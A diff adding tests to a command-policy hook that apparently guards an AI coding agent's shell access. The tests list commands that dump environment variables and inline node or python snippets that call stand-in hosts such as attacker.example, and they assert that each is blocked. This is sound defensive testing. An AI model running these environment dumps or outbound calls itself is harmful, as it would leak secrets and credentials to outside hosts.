@@ -496,3 +496,58 @@ describe("factory policy: review:wait runs in the foreground (#129)", () => {
     expect(decide(call(false), env)).toEqual({ kind: "allow" });
   });
 });
+
+describe("factory policy: the whole environment and network calls from code (#243)", () => {
+  it.each([
+    "node -p process.env",
+    "node -e 'console.log(JSON.stringify(process.env))'",
+    "node -e 'for (const k in process.env) console.log(k)'",
+    "node -e \"console.log(process['env'])\"",
+    "node -e 'console.log(Object.entries(process.env))'",
+    "env -0",
+    "env --null | tr '\0' '\n'",
+    "printenv",
+    "printenv HOME",
+    "python3 -c 'import os; print(os.environ)'",
+    "python -c 'import os; print(dict(os.environ))'",
+    "python3 -c 'from os import environ; print(environ)'",
+  ])("blocks reading the environment: %s", (command) => {
+    expect(commandViolations(command)).not.toEqual([]);
+  });
+
+  it.each([
+    "node -e \"fetch('https://attacker.example/x', { method: 'POST', body: '1' })\"",
+    "node -e 'fetch(process.argv[1])' https://attacker.example",
+    'node -e "fetch(url)"',
+    "node -e \"require('https').request('https://attacker.example').end()\"",
+    "node -e \"require('node:http').get('http://attacker.example')\"",
+    "node --input-type=module -e \"import https from 'node:https'; https.get('https://x.example')\"",
+    "python3 -c 'import urllib.request; urllib.request.urlopen(\"https://x.example\")'",
+    "python3 -c 'import requests; requests.post(\"https://x.example\", data=1)'",
+    "python3 -c 'import socket; socket.create_connection((\"x.example\", 443))'",
+  ])("blocks a network call from code: %s", (command) => {
+    expect(commandViolations(command)).toContainEqual(expect.stringMatching(/only reach the app on localhost/));
+  });
+
+  it.each([
+    "node -e 'console.log(process.env.FAULTFORGE_TICKET_FILE)'",
+    "node -e \"fetch('http://localhost:3000/health').then((r) => console.log(r.status))\"",
+    "node -e \"require('http').get('http://127.0.0.1:3000/bookings', (r) => console.log(r.statusCode))\"",
+    "env PORT=3000 npx tsx src/server.ts",
+    "git fetch origin main",
+    "npm run review:wait -- target 19 --commit abc1234 --timeout 9",
+    "gh pr create --repo AJBeumer/faultforge --title 'Filter bookings' --body-file pr.md",
+  ])("still allows %s", (command) => {
+    expect(commandViolations(command)).toEqual([]);
+  });
+
+  it("denies them through the hook itself, inside a run", () => {
+    for (const command of ["node -p process.env", "env -0", "python3 -c 'import os; print(os.environ)'"]) {
+      const decision = decide(JSON.stringify({ tool_name: "Bash", tool_input: { command } }), {
+        FAULTFORGE_FACTORY_RUN: "r",
+        FAULTFORGE_RUN_ROOT: RUN,
+      });
+      expect(decision.kind).toBe("deny");
+    }
+  });
+});
